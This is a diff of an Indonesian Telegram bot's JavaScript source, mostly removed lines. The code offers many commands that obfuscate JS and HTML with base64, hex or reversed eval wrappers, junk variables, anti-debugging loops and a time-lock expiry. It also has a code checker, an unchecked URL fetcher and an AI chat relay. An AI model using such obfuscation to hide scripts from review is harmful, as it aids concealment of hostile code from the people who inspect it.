-    const thumb = await getThumbnailBuffer();
-    if (messageId) {
-        if (thumb) {
-            await ctx.telegram.editMessageMedia(ctx.chat.id, messageId, undefined, {
-                type: 'photo',
-                media: { source: thumb },
-                caption,
-                parse_mode: 'HTML'
-            }, { reply_markup: EncV1Keyboard });
-        } else {
-            await ctx.telegram.editMessageText(ctx.chat.id, messageId, undefined, caption, {
-                parse_mode: 'HTML',
-                reply_markup: EncV1Keyboard
-            });
-        }
-    } else {
-        if (thumb) {
-            await ctx.replyWithPhoto({ source: thumb }, { caption, parse_mode: 'HTML', reply_markup: EncV1Keyboard });
-        } else {
-            await ctx.reply(caption, { parse_mode: 'HTML', reply_markup: EncV1Keyboard });
-        }
-    }
-}
-
-async function EncV2(ctx, messageId = null) {
-    const caption = `
-<blockquote><b>╾═━═╼ 𝖤𝗇𝖼 𝖵𝟤 ╾═━═╼</b></blockquote>
-<b>▢ /enccustom 𝖢𝗎𝗌𝗍𝗈𝗆 𝖭𝖺𝗆𝖾</b>
-<b>▢ /invisenc 𝖨𝗇𝗏𝗂𝗌𝖻𝗅𝖾 𝖧𝖺𝗋𝖽</b>
-<b>▢ /japanenc 𝖩𝖺𝗉𝖺𝗇𝖾𝗌𝖾 𝖲𝗍𝗒𝗅𝖾</b>
-<b>▢ /encarab 𝖠𝗋𝖺𝖻 𝖲𝗍𝗒𝗅𝖾</b>
-<b>▢ /siuenc 𝖲𝗂𝗎 𝖲𝗍𝗒𝗅𝖾</b>
-<b>▢ /japan 𝖩𝖺𝗉𝖺𝗇 𝖲𝗍𝗒𝗅𝖾</b>
-<b>▢ /nebula 𝖭𝖾𝖻𝗎𝗅𝖺 𝖲𝗍𝗒𝗅𝖾</b>
-<b>▢ /var 𝖵𝖺𝗋 𝖲𝗍𝗒𝗅𝖾</b>
-<b>▢ /invishtml Encrypt Hmtl</b>
-<blockquote><b>╾═━═╼  𝖢𝖺𝗋𝖺 𝖯𝖾𝗇𝗀𝗀𝗎𝗇𝖺𝖺𝗇 ╾═━═╼</b></blockquote>
-<b>/enccustom</b> </code>果Prime皮Sabil出Official去</code>
-<b>Jangan ada spasi dalam text</b>
-<blockquote>╾═━═━═━═━═━═━═━═━═━</blockquote>
-`;
-    const thumb = await getThumbnailBuffer();
-    if (messageId) {
-        if (thumb) {
-            await ctx.telegram.editMessageMedia(ctx.chat.id, messageId, undefined, {
-                type: 'photo',
-                media: { source: thumb },
-                caption,
-                parse_mode: 'HTML'
-            }, { reply_markup: EncV2Keyboard });
-        } else {
-            await ctx.telegram.editMessageText(ctx.chat.id, messageId, undefined, caption, {
-                parse_mode: 'HTML',
-                reply_markup: EncV2Keyboard
-            });
-        }
-    } else {
-        if (thumb) {
-            await ctx.replyWithPhoto({ source: thumb }, { caption, parse_mode: 'HTML', reply_markup: EncV2Keyboard });
-        } else {
-            await ctx.reply(caption, { parse_mode: 'HTML', reply_markup: EncV2Keyboard });
-        }
-    }
-}
-
-// ==================== CALLBACK ====================
-bot.action('open_menu', async (ctx) => {
-    const messageId = ctx.callbackQuery.message.message_id;
-    await showMenu1(ctx, messageId);
-    await ctx.answerCbQuery();
-});
-
-bot.action('main_menu', async (ctx) => {
-    const messageId = ctx.callbackQuery.message.message_id;
-    await showMenu1(ctx, messageId);
-    await ctx.answerCbQuery();
-});
-
-bot.action('enc_menu_v1', async (ctx) => {
-    const messageId = ctx.callbackQuery.message.message_id;
-    await EncV1(ctx, messageId);
-    await ctx.answerCbQuery();
-});
-
-bot.action('enc_menu_v2', async (ctx) => {
-    const messageId = ctx.callbackQuery.message.message_id;
-    await EncV2(ctx, messageId);
-    await ctx.answerCbQuery();
-});
-
-bot.action('tools_menu', async (ctx) => {
-    const messageId = ctx.callbackQuery.message.message_id;
-    await showMenu2(ctx, messageId);
-    await ctx.answerCbQuery();
-});
-// ==================== RANDOM ====================
-
-
-// Fixed helper functions
-
-function randomHex(length = 40){
-  return crypto.randomBytes(length).toString("hex")
-}
-
-function randomName(list){
-  const extra=["ツ","々","〆","メ","ん","ฬ","刃","ฬ"]
-  return list[Math.floor(Math.random()*list.length)] +
-    extra[Math.floor(Math.random()*extra.length)] +
-    Math.floor(Math.random()*99999)
-}
-
-function chaosVars(total=500,names=[]){
-  let out=""
-  for(let i=0;i<total;i++){
-    out += `var ${randomName(names)}="${randomHex(80)}";\n`
-  }
-  return out
-}
-
-function makeB64Style(code,names,count=500){
-  const b64 = Buffer.from(code).toString("base64")
-  const funcName = randomName(names)
-  const varName = randomName(names)
-
-  return `(function(){
-${chaosVars(count,names)}
-function ${funcName}(){
-const ${varName}="${b64}";
-return Buffer.from(${varName},"base64").toString();
-}
-eval(${funcName}());
-})();`
-}
-
-function artilleryStyle(code){
-  return makeB64Style(code,["つき","さくら","ほし","ゆき","ねこ","みず","かぜ","やみ"],600)
-}
-
-function hardcoreStyle(code){
-  const names=["悪魔","闇","無限","崩壊","零","死神","幻","滅"]
-  const b64=Buffer.from(code).toString("base64")
-  const funcName=randomName(names)
-  const varName=randomName(names)
-
-  return `(function(){
-${chaosVars(1000,names)}
-setInterval(()=>{debugger},1)
-console.clear()
-function ${funcName}(){
-const ${varName}="${b64}";
-return Buffer.from(${varName},"base64").toString();
-}
-eval(${funcName}());
-})();`
-}
-
-function phantomStyle(code){
-  const hex=Buffer.from(code).toString("hex")
-  return `eval(Buffer.from("${hex}","hex").toString())`
-}
-
-function balancedStyle(code){
-  return makeB64Style(code,["均衡","静","風","月"],300)
-}
-
-function reversedStyle(code){
-  const rev=code.split("").reverse().join("")
-  return `eval("${rev}".split("").reverse().join(""))`
-}
-
-function rosemaryStyle(code){
-  return makeB64Style(code,["薔薇","深夜","死","夢"],800)
-}
-
-function invisStyle(code){
-  const uni=escape(Buffer.from(code).toString("base64"))
-  return `eval(Buffer.from(unescape("${uni}"),"base64").toString())`
-}
-
-function japanStyle(code){
-  return makeB64Style(code,["つき","さくら","ほし","ねこ","そら","ゆき","みず","かぜ","れい","やみ","むげん","はな"],1500)
-}
-
-function arabStyle(code){
-  return makeB64Style(code,["سلام","قمر","نور","ليل","شمس","نار","روح","موت"],900)
-}
-
-function siuStyle(code){
-  return makeB64Style(code,["SIUU","RONALDO","GOAL","CR7"],600)
-}
-
-function nebulaStyle(code){
-  return makeB64Style(code,["星雲","宇宙","銀河","闇","ブラック","無限","ゼロ"],2500)
-}
-
-function varStyle(code){
-  return `(function(){${code}})();`
-}
-
-function customStyle(code,name){
-  const names=["改造","極限","混乱","破壊","地獄","暗黒","虚無"]
-  const b64=Buffer.from(code).toString("base64")
-  const funcName = /^[A-Za-z_$][A-Za-z0-9_$]*$/.test(name) ? name : "CustomLoader"
-  const varName=randomName(names)
-
-  return `(function(){
-${chaosVars(1200,names)}
-function ${name}(){
-const ${varName}="${b64}";
-return Buffer.from(${varName},"base64").toString();
-}
-eval(${funcName}());
-})();`
-}
-
-function timeLockStyle(code,days){
-  const expired=Date.now()+(Number(days)*86400000)
-  const b64=Buffer.from(code).toString("base64")
-
-  return `(function(){
-if(Date.now()>${expired}){
-console.log("Script Expired");
-process.exit();
-}
-eval(Buffer.from("${b64}","base64").toString());
-})();`
-}
-
-
-// COMMAND
-// /artillery
-bot.command(
-'artillery',
-(ctx)=>
-processObfuscate(
-ctx,
-artilleryStyle,
-'Artillery'
-)
-)
-
-// /hardcore
-bot.command(
-'hardcore',
-(ctx)=>
-processObfuscate(
-ctx,
-hardcoreStyle,
-'Hardcore'
-)
-)
-
-// /phantom
-bot.command(
-'phantom',
-(ctx)=>
-processObfuscate(
-ctx,
-phantomStyle,
-'Phantom'
-)
-)
-
-// /balanced
-bot.command(
-'balanced',
-(ctx)=>
-processObfuscate(
-ctx,
-balancedStyle,
-'Balanced'
-)
-)
-
-// /reversed
-bot.command(
-'reversed',
-(ctx)=>
-processObfuscate(
-ctx,
-reversedStyle,
-'Reversed'
-)
-)
-
-// /rosemary
-bot.command(
-'rosemary',
-(ctx)=>
-processObfuscate(
-ctx,
-rosemaryStyle,
-'Rosemary'
-)
-)
-
-// /invisenc
-bot.command(
-'invisenc',
-(ctx)=>
-processObfuscate(
-ctx,
-invisStyle,
-'InvisEnc'
-)
-)
-
-// /japanenc
-bot.command(
-'japanenc',
-(ctx)=>
-processObfuscate(
-ctx,
-japanStyle,
-'japanenc'
-)
-)
-
-// /encarab
-bot.command(
-'encarab',
-(ctx)=>
-processObfuscate(
-ctx,
-arabStyle,
-'encarab'
-)
-)
-
-// /siuenc
-bot.command(
-'siuenc',
-(ctx)=>
-processObfuscate(
-ctx,
-siuStyle,
-'siuenc'
-)
-)
-
-// /japan
-bot.command(
-'japan',
-(ctx)=>
-processObfuscate(
-ctx,
-japanStyle,
-'Japan'
-)
-)
-
-// /nebula
-bot.command(
-'nebula',
-(ctx)=>
-processObfuscate(
-ctx,
-nebulaStyle,
-'Nebula'
-)
-)
-
-// /var
-bot.command(
-'var',
-(ctx)=>
-processObfuscate(
-ctx,
-varStyle,
-'Var'
-)
-)
-
-// /enctime
-bot.command(
-'enctime',
-async(ctx)=>{
-
-const days =
-ctx.message.text
-.split(' ')[1]
-
-if(!days){
-
-return ctx.reply(
-'❌ Example : /enctime 30'
-)
-
-}
-
-await processObfuscate(
-ctx,
-(code)=>timeLockStyle(code, days),
-'EncTime'
-)
-
-}
-)
-
-// /enccustom
-bot.command(
-'enccustom',
-async(ctx)=>{
-
-const text =
-ctx.message.text
-.split(' ')
-.slice(1)
-.join(' ')
-
-if(!text){
-
-return ctx.reply(
-'❌ Example : /enccustom SabilOfficial'
-)
-
-}
-
-await processObfuscate(
-ctx,
-(code)=>customStyle(code, text),
-'EncCustom'
-)
-
-}
-)
-
-// ==================== HARDHTML ====================
-
-bot.command("hardhtml", async (ctx) => {
-
-try {
-
-if (!ctx.message.reply_to_message?.document) {
-return ctx.reply("Reply file html.");
-}
-
-const file =
-await ctx.telegram.getFile(
-ctx.message.reply_to_message.document.file_id
-)
-
-const link = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`
-
-const res =
-await axios.get(link)
-
-const html = res.data
-
-const b64 =
-Buffer
-.from(html)
-.toString("base64")
-
-let anti = ""
-
-for(let i=0;i<800;i++){
-
-anti += `
-var _${randomHex(8)}="${randomHex(50)}";
-`
-
-}
-
-const result = `
-<script>
-${anti}
-setInterval(()=>{
-debugger
-},1)
-eval(
-atob(
-"${b64}"
-)
-)
-</script>
-`
-
-await ctx.replyWithDocument({
-source: Buffer.from(result),
-filename: "hardhtml.html"
-})
-
-} catch(e){
-
-ctx.reply(String(e))
-
-}
-
-})
-
-// ==================== INVISHTML ====================
-
-bot.command("invishtml", async (ctx) => {
-
-try {
-
-if (!ctx.message.reply_to_message?.document) {
-return ctx.reply("Reply file html.");
-}
-
-const file =
-await ctx.telegram.getFile(
-ctx.message.reply_to_message.document.file_id
-)
-
-const link = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`
-
-const res =
-await axios.get(link)
-
-const html = res.data
-
-const uni =
-escape(
-Buffer
-.from(html)
-.toString("base64")
-)
-
-const result = `
-<script>
-eval(
-atob(
-unescape(
-"${uni}"
-)
-)
-)
-</script>
-`
-
-await ctx.replyWithDocument({
-source: Buffer.from(result),
-filename: "invishtml.html"
-})
-
-} catch(e){
-
-ctx.reply(String(e))
-
-}
-
-})
-
-// ==================== GETSOURCE ====================
-
-bot.command("getsource", async (ctx) => {
-
-try {
-
-const url =
-ctx.message.text
-.split(" ")
-.slice(1)
-.join(" ")
-
-if(!url){
-return ctx.reply(
-"Example:\n/getsource https://example.com"
-)
-}
-
-const res =
-await axios.get(url)
-
-const html = res.data
-
-await ctx.replyWithDocument({
-source: Buffer.from(html),
-filename: "source.html"
-})
-
-} catch(e){
-
-ctx.reply(String(e))
-
-}
-
-})
-
-bot.command("cekfunc", async (ctx) => {
-try {
-
-if (!ctx.message.reply_to_message)
-return ctx.reply("Reply function JavaScript yang ingin dicek.")
-
-const text =
-ctx.message.reply_to_message.text ||
-ctx.message.reply_to_message.caption
-
-if (!text)
-return ctx.reply("Pesan yang direply tidak berisi kode.")
-
-let acorn
-try {
-acorn = require("acorn")
-} catch {
-return ctx.reply("Module acorn belum terinstall.\nInstall dengan: npm install acorn")
-}
-
-try {
-
-acorn.parse(text, {
-ecmaVersion: "latest",
-sourceType: "module",
-locations: true
-})
-
-return ctx.reply(`🔎 Mengecek Code.....
-
-Asekk Ga ada Error Cuy Di Code Nya.`)
-
-} catch (err) {
-
-const lines = text.split("\n")
-const line = err.loc.line
-const column = err.loc.column
-
-const start = Math.max(0, line - 3)
-const end = Math.min(lines.length, line + 2)
-
-const snippet = lines.slice(start, end).map((l, i) => {
-const num = start + i + 1
-return num === line
-? `👉 ${num} | ${l}`
-: `   ${num} | ${l}`
-}).join("\n")
-
-return ctx.reply(`Yahhh Code Nya Error Ni Fixed Dong
-
-${err.message}
-Line ${line}:${column}
-
-📌 Cuplikan:
-${snippet}`)
-
-}
-
-} catch (e) {
-console.error(e)
-ctx.reply("Terjadi error saat mengecek code.")
-}
-
-});
-
-// ==================== INFOERROR ====================
-
-bot.command("infoerror", async (ctx) => {
-
-try {
-
-if (!ctx.message.reply_to_message?.document) {
-return ctx.reply("Reply file js.");
-}
-
-const file =
-await ctx.telegram.getFile(
-ctx.message.reply_to_message.document.file_id
-)
-
-const link = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`
-
-const res =
-await axios.get(link)
-
-let code = res.data
-
-let info = []
-
-if(code.includes("eval(eval(")){
-info.push("Nested eval detected")
-}
-
-if(code.includes("debugger")){
-info.push("Debugger detected")
-}
-
-if(code.includes("while(true)")){
-info.push("Infinite loop detected")
-}
-
-if(code.length > 500000){
-info.push("File too large")
-}
-
-if(info.length < 1){
-info.push("No problem detected")
-}
-
-ctx.reply(
-`INFO ERROR:\n\n- ${info.join("\n- ")}`
-)
-
-} catch(e){
-
-ctx.reply(String(e))
-
-}
-
-})
-
-// ==================== FIXFUNC ====================
-
-bot.command("fixfunc", async (ctx) => {
-
-try {
-
-if (!ctx.message.reply_to_message?.document) {
-return ctx.reply("Reply file js.");
-}
-
-const file =
-await ctx.telegram.getFile(
-ctx.message.reply_to_message.document.file_id
-)
-
-const link = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`
-
-const res =
-await axios.get(link)
-
-let code = res.data
-
-code = code
-.replace(/debugger;/g,"")
-.replace(/while\s*\(\s*true\s*\)/g,"while(false)")
-.replace(/eval\(eval\(/g,"eval(")
-
-await ctx.replyWithDocument({
-source: Buffer.from(code),
-filename: "fixed.js"
-})
-
-} catch(e){
-
-ctx.reply(String(e))
-
-}
-
-})
-
-// =============================
-// CMD BACKUP
-// =============================
-bot.command("backup", async (ctx) => {
-
-        const userId =
-            Number(ctx.from.id)
-
-        // owner only
-        if (userId !== config.OWNER_ID) {
+        if (!hasError) {
 
             return ctx.reply(
-                "❌ Owner only."
+`
+✅ Tidak ditemukan error.
+📄 File : <code>${fileName}</code>
+`,
+                {
+                    parse_mode: "HTML",
+                }
             )
+
         }
 
-        await ctx.reply(
-            "📦 Membuat backup..."
+        const result =
+`
+HASIL ANALISIS ERROR
+────────────────────────────
+
+File : ${fileName}
+Ukuran : ${Buffer.byteLength(code)}
+Baris Error :
+${errorLine || "-"},
+
+Jenis Error :
+${errorMsg}
+
+────────────────────────────
+
+Saran Perbaikan :
+${fixSuggest}
+
+────────────────────────────
+
+Cuplikan Error :
+${annotated}
+`
+
+        if (result.length <= 3500) {
+
+            return ctx.reply(
+                `\`\`\`js
+                ${esc(result)}\`\`\``,
+                {
+                    parse_mode: "Markdown",
+                }
+            )
+
+        }
+
+        const txtFile =
+            path.join(
+                __dirname,
+                `analisis-error-${Date.now()}.txt`
+            )
+
+        fs.writeFileSync(
+            txtFile,
+            result
         )
 
-        await sendBackup(
-            "Manual Backup"
+        await ctx.replyWithDocument(
+            {
+                source: txtFile,
+                filename: "analisis-error.js"
+            },
+            {
+                caption:
+                    "📄 Analisis terlalu panjang dikirim via file.js"
+            }
         )
 
-        await ctx.reply(
-            "✅ Backup berhasil dikirim ke owner."
-        )
-})
+        fs.unlinkSync(txtFile)
 
-// =============================
-// CMD CHATADMIN
-// =============================
-bot.command("chatowner", async (ctx) => {
+    } catch (err) {
+
+        await ctx.telegram
+            .deleteMessage(
+                waitMsg.chat.id,
+                waitMsg.message_id
+            )
+            .catch(() => {})
+
+        return ctx.reply(
+`
+❌ Gagal menganalisis file
+${err.message}
+`
+        )
+
+    }
+
+});
+
+bot.command("chatowner", onlyJoinChannel, async (ctx) => {
 
     const userId = Number(ctx.from.id)
     const OWNER_ID = Number(config.OWNER_ID)
@@ -2151,651 +1415,38 @@ ${step.text}</pre>
 <blockquote>Broadcast berhasil dikirim ke seluruh user aktif.</blockquote>`,
         {
             parse_mode:
-            "HTML"
+            "HTML",
+            reply_markup: keyboard2
         }
     )
 
 })
 
-// =============================
-// MAINTENANCE COMMAND
-// =============================
-bot.command("maintenance", async (ctx) => {
+bot.command("backup", async (ctx) => {
 
-    const userId = Number(ctx.from.id)
+        const userId =
+            Number(ctx.from.id)
 
-    // owner only
-    if (userId !== config.OWNER_ID) {
-        return ctx.reply("❌ Khusus owner.")
-    }
-
-    const text = ctx.message.text
-
-    // ambil args
-    const args = text.split(" ").slice(1).join(" ")
-
-    // kalau kosong
-    if (!args) {
-        return ctx.reply(`\`\`\`js
-📌 Maintenance Mode
-
-/maintenance on|update system
-/maintenance off|maintenance selesai\`\`\`
-            `,
-            {
-                parse_mode: "Markdown"
-            }
-        )
-    }
-
-    // split on/off dan alasan
-    const [mode, ...reasonArray] = args.split("|")
-
-    const input = mode.trim().toLowerCase()
-
-    const reason = reasonArray.join("|").trim() || "Tidak ada alasan"
-
-    // =============================
-    // ON
-    // =============================
-    if (input === "on") {
-
-        fs.writeFileSync(
-            PATH_MAINTENANCE,
-            JSON.stringify({
-                status: true,
-                reason
-            }, null, 2)
-        )
-
-        return ctx.reply(
-            `\`\`\`js
-🛠 Maintenance Enabled
-
-📌 Status : ON
-📝 Alasan : ${reason}\`\`\`
-            `,
-            {
-                parse_mode: "Markdown"
-            }
-        )
-    }
-
-    // =============================
-    // OFF
-    // =============================
-    if (input === "off") {
-
-        fs.writeFileSync(
-            PATH_MAINTENANCE,
-            JSON.stringify({
-                status: false,
-                reason
-            }, null, 2)
-        )
-
-        return ctx.reply(
-            `\`\`\`js
-✅ Maintenance Disabled
-
-📌 Status : OFF
-📝 Keterangan : ${reason}\`\`\`
-            `,
-            {
-                parse_mode: "Markdown"
-            }
-        )
-    }
-
-    // invalid
-    return ctx.reply(
-        `\`\`\`js
-✘ Format Salah
-
-/maintenance on|alasan
-/maintenance off|alasan\`\`\`
-        `,
-        {
-            parse_mode: "Markdown"
-        }
-    )
-})
-// ==================== COMMAND /CLAUDE ====================
-bot.command('ai', async (ctx) => {
-
-    const chatId = ctx.chat.id;
-    const ownerId = config.OWNER_ID;
-    const sessionFp = path.join(__dirname, './database/ai.json');
-
-    // Cek maintenance (jika fungsi isMaintenance ada)
-    if (typeof isMaintenance === 'function' && isMaintenance() && chatId !== ownerId) {
-        return ctx.reply('🛠 Bot sedang maintenance.');
-    }
-
-    // Ambil teks setelah /claude
-    const q = ctx.message.text.replace(/^\/ai\s*/, '').trim();
-    if (!q) {
-        return ctx.reply('Ketik /ai sambil isi pesan yang ingin di tanyakan');
-    }
-
-    // Kirim pesan "sedang memproses..."
-    const waitMsg = await ctx.reply('Waiting...');
-
-    // Fungsi load/save session
-    const loadAI = () => {
-        try {
-            if (!fs.existsSync(sessionFp)) {
-                fs.writeJsonSync(sessionFp, {});
-                return {};
-            }
-            return fs.readJsonSync(sessionFp);
-        } catch (e) {
-            console.error('[AI-SESS-ERR]', e.message);
-            return {};
-        }
-    };
-    const saveAI = (data) => {
-        try {
-            fs.writeJsonSync(sessionFp, data, { spaces: 2 });
-        } catch (e) {
-            console.error('[AI-SAVE-ERR]', e.message);
-        }
-    };
-    const getSession = (uid, db) => {
-        if (!db[uid]) db[uid] = [];
-        return db[uid];
-    };
-
-    try {
-        const uid = ctx.from.id.toString();
-        const aiDb = loadAI();
-        const sess = getSession(uid, aiDb);
-
-        sess.push({ role: 'user', content: q });
-        if (sess.length > 20) aiDb[uid] = sess.slice(-10);
-
-        const systemPrompt = `
-Aturan format jawaban:
-- Gunakan Markdown Telegram sederhana (bold, bullet).
-- Dilarang menggunakan tabel.
-- Jika penjelasan biasa, pakai teks dan bullet saja.
-- Jika ada kode, gunakan blok kode (\`\`\`) sesuai bahasa.
-- Jangan gunakan emoji berlebihan.
-- Langsung to the point, jangan ulang pertanyaan user.
-- Pastikan output aman untuk Telegram tanpa error parse.
-Session Memory:
-- Lihat history chat terakhir (max 10 pesan).
-- Lanjutkan konteks percakapan sebelumnya.
-- Ingat detail yang sudah disebutkan user.`.trim();
-
-        const chatHistory = [
-            { role: 'system', content: systemPrompt },
-            ...sess.slice(-10),
-        ];
-
-        const { data } = await axios.post(
-            'https://aliicia.my.id/api/chatgpt',
-            { message: chatHistory },
-            { headers: { 'Content-Type': 'application/json' } }
-        );
-
-        let ans = (data?.response || 'Gagal mendapatkan jawaban.')
-            .replace(/\u0000/g, '').replace(/\r\n/g, '\n').replace(/\r/g, '\n').trim();
-
-        sess.push({ role: 'assistant', content: ans });
-        saveAI(aiDb);
-
-        // Fungsi split untuk memotong pesan > 4000 karakter (batas aman Telegram 4096)
-        const splitResponse = (text, maxLen = 4000) => {
-            const parts = [];
-            const codeRx = /```[\s\S]*?```/g;
-            const segs = [];
-            let lastIdx = 0, m;
-
-            while ((m = codeRx.exec(text)) !== null) {
-                if (m.index > lastIdx) segs.push({ t: 'text', v: text.substring(lastIdx, m.index) });
-                segs.push({ t: 'code', v: m[0] });
-                lastIdx = m.index + m[0].length;
-            }
-            if (lastIdx < text.length) segs.push({ t: 'text', v: text.substring(lastIdx) });
-
-            let cur = '';
-            for (const seg of segs) {
-                if ((cur.length + seg.v.length) <= maxLen) {
-                    cur += seg.v;
-                } else {
-                    if (cur.trim()) parts.push(cur.trim());
-                    if (seg.t === 'code' && seg.v.length > maxLen) {
-                        const inner = seg.v.substring(3, seg.v.length - 3);
-                        const lang = (seg.v.match(/^```(\w+)/) || ['', ''])[1];
-                        const lines = inner.split('\n');
-                        let chunk = `\`\`\`${lang}\n`;
-                        for (const ln of lines) {
-                            if ((chunk.length + ln.length + 1) > maxLen - 3) {
-                                chunk += '```';
-                                parts.push(chunk);
-                                chunk = `\`\`\`${lang}\n${ln}\n`;
-                            } else {
-                                chunk += ln + '\n';
-                            }
-                        }
-                        if (chunk.trim() !== `\`\`\`${lang}`) {
-                            chunk += '```';
-                            cur = chunk;
-                        } else {
-                            cur = '';
-                        }
-                    } else {
-                        cur = seg.v;
-                    }
-                }
-            }
-            if (cur.trim()) parts.push(cur.trim());
-            return parts;
-        };
-
-        const chunks = splitResponse(ans, 4000);
-        // Hapus pesan "sedang memproses..."
-        await ctx.deleteMessage(waitMsg.message_id).catch(() => {});
-        // Kirim setiap bagian
-        for (const chunk of chunks) {
-            await ctx.reply(chunk, { parse_mode: 'Markdown' });
-        }
-    } catch (err) {
-        console.error('[AI-ERR]', err.message);
-        await ctx.deleteMessage(waitMsg.message_id).catch(() => {});
-        ctx.reply('❌ Terjadi error: ' + err.message);
-    }
-});
-
-bot.command("cekerror", async (ctx) => {
-
-    const rep = ctx.message.reply_to_message
-
-    let code = ""
-    let fileName = "code"
-
-    if (rep?.document) {
-
-        const ext = path
-            .extname(rep.document.file_name)
-            .toLowerCase()
-
-        const allowed = [
-            ".js",
-            ".json",
-            ".html",
-            ".py"
-        ]
-
-        if (!allowed.includes(ext)) {
+        // owner only
+        if (userId !== config.OWNER_ID) {
 
             return ctx.reply(
-                "❌ Format yang didukung:\n.js\n.json\n.html\n.py"
+                "❌ Owner only."
             )
-
         }
 
-        fileName =
-            rep.document.file_name
-
-        try {
-
-            code =
-                await downloadTgFile(
-                    ctx.telegram,
-                    rep.document.file_id
-                )
-
-        } catch (e) {
-
-            return ctx.reply(
-                `❌ Gagal download file:\n${e.message}`
-            )
-
-        }
-
-    } else if (rep?.text) {
-
-        code =
-            rep.text.trim()
-
-    } else {
-
-        return ctx.reply(
-`
-<b>Cara Pakai</b>
-
-Reply kode atau file:
-
-• .js
-• .json
-• .html
-• .py
-
-Lalu ketik:
-
-<code>/cekerror</code>
-`,
-            {
-                parse_mode: "HTML"
-            }
-        )
-
-    }
-
-    if (!code.trim()) {
-
-        return ctx.reply(
-            "❌ Kode kosong."
-        )
-
-    }
-
-    const waitMsg =
         await ctx.reply(
-            "🔍 Menganalisis Error..."
+            "📦 Membuat backup..."
         )
 
-    try {
-
-        const {
-            errorMsg,
-            errorLine,
-            fixSuggest,
-            annotated,
-            hasError
-        } = analyseCode(code)
-
-        await ctx.telegram
-            .deleteMessage(
-                waitMsg.chat.id,
-                waitMsg.message_id
-            )
-            .catch(() => {})
-
-        if (!hasError) {
-
-            return ctx.reply(
-`
-✅ Tidak ditemukan error.
-📄 File : <code>${fileName}</code>
-`,
-                {
-                    parse_mode: "HTML"
-                }
-            )
-
-        }
-
-        const result =
-`
-HASIL ANALISIS ERROR
-────────────────────────────
-
-File : ${fileName}
-Ukuran : ${Buffer.byteLength(code)}
-Baris Error :
-${errorLine || "-"},
-
-Jenis Error :
-${errorMsg}
-
-────────────────────────────
-
-Saran Perbaikan :
-${fixSuggest}
-
-────────────────────────────
-
-Cuplikan Error :
-${annotated}
-
-────────────────────────────
-Analisis File/Code Selesai
-`
-
-        if (result.length <= 3500) {
-
-            return ctx.reply(
-                `\`\`\`js
-                ${esc(result)}\`\`\``,
-                {
-                    parse_mode: "Markdown"
-                }
-            )
-
-        }
-
-        const txtFile =
-            path.join(
-                __dirname,
-                `analisis-error-${Date.now()}.txt`
-            )
-
-        fs.writeFileSync(
-            txtFile,
-            result
+        await sendBackup(
+            "Manual Backup"
         )
 
-        await ctx.replyWithDocument(
-            {
-                source: txtFile,
-                filename: "analisis-error.js"
-            },
-            {
-                caption:
-                    "📄 Analisis terlalu panjang dikirim via file.js"
-            }
+        await ctx.reply(
+            "✅ Backup berhasil dikirim ke owner."
         )
-
-        fs.unlinkSync(txtFile)
-
-    } catch (err) {
-
-        await ctx.telegram
-            .deleteMessage(
-                waitMsg.chat.id,
-                waitMsg.message_id
-            )
-            .catch(() => {})
-
-        return ctx.reply(
-`
-❌ Gagal menganalisis file
-${err.message}
-`
-        )
-
-    }
-
-});
-
-bot.command("cekidemoji", async (ctx) => {
-  const reply = ctx.message.reply_to_message;
-
-  if (!reply) {
-    return ctx.reply(
-      `<blockquote>⬡ <b>Cek Emoji Premium</b>\n\nReply ke pesan yang mengandung <b>custom emoji</b>, lalu kirim <code>/cekidemoji</code></blockquote>`,
-      { parse_mode: "HTML" }
-    );
-  }
-
-  const collect = (ents = []) =>
-    ents.filter(e => e.type === "custom_emoji").map(e => e.custom_emoji_id);
-
-  const unique = [...new Set([
-    ...collect(reply.entities),
-    ...collect(reply.caption_entities)
-  ])];
-
-  if (unique.length === 0) {
-    return ctx.reply(
-      `<blockquote>⬡ <b>Cek Emoji Premium</b>\n\n${E.err} Tidak ada custom emoji terdeteksi.</blockquote>`,
-      { parse_mode: "HTML" }
-    );
-  }
-
-  // Fetch extra info dari Telegram API
-  let stickerMap = {};
-  try {
-    const res = await ctx.telegram.callApi('getCustomEmojiStickers', {
-      custom_emoji_ids: unique.slice(0, 200)
-    });
-    if (Array.isArray(res)) res.forEach(s => { stickerMap[s.custom_emoji_id] = s; });
-  } catch { /* silent */ }
-
-  const sender = reply.from?.username
-    ? `@${reply.from.username}`
-    : (reply.from?.first_name || 'Unknown');
-
-  // Kirim header dulu
-  let header = `<blockquote>⬡ <b>Custom Emoji Detected</b>\n\n`;
-  header    += `${E.user} Dari  : ${sender}\n`;
-  header    += `${E.total} Total : <b>${unique.length}</b> emoji</blockquote>`;
-  await ctx.reply(header, { parse_mode: "HTML" });
-
-  // Kirim tiap emoji satu per satu agar preview tampil jelas
-  for (let i = 0; i < unique.length; i++) {
-    const id = unique[i];
-    const s  = stickerMap[id];
-
-    // Fallback karakter unicode jika bukan premium — tampil di semua user
-    const fallback = s?.emoji || '✨';
-
-    // Preview: gunakan tg-emoji tag langsung (akan render di premium),
-    // fallback otomatis ke karakter unicode di non-premium
-    const preview = `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
-
-    // Label tipe
-    const isPremium = s?.is_premium_sticker ?? false;
-    const tipeLabel = isPremium
-      ? `${E.ok} <b>Premium</b>`
-      : `${E.emoFree} <b>Free</b>`;
-
-    // Set name jika ada
-    const setLine = s?.set_name
-      ? `\n${E.set} Set  : <code>${s.set_name}</code>`
-      : '';
-
-    let block = `<blockquote><b>${i + 1}.</b> ${preview}  Preview\n`;
-    block    += `${E.info2} ID   : <code>${id}</code>\n`;
-    block    += `${tipeLabel}${setLine}\n`;
-    block    += `${E.doc} Cara pakai:\n`;
-    block    += `<code>&lt;tg-emoji emoji-id="${id}"&gt;${fallback}&lt;/tg-emoji&gt;</code></blockquote>`;
-
-    await ctx.reply(block, { parse_mode: "HTML" });
-  }
-});
-
-bot.command("fixerror", async ctx => {
-
-  const rep = ctx.message.reply_to_message
-  let code  = ""
-
-  if (rep?.document?.file_name?.endsWith(".js")) {
-    try { code = await downloadTgFile(ctx.telegram, rep.document.file_id) }
-    catch (e) { return ctx.reply(`Gagal download file: ${e.message}`) }
-  } else if (rep?.text) {
-    code = rep.text.trim()
-  } else {
-    return ctx.reply(
-`<blockquote><b>Cara pakai /fixerror</b>
-
-Reply ke pesan berisi kode JavaScript,
-lalu ketik /fixerror
-
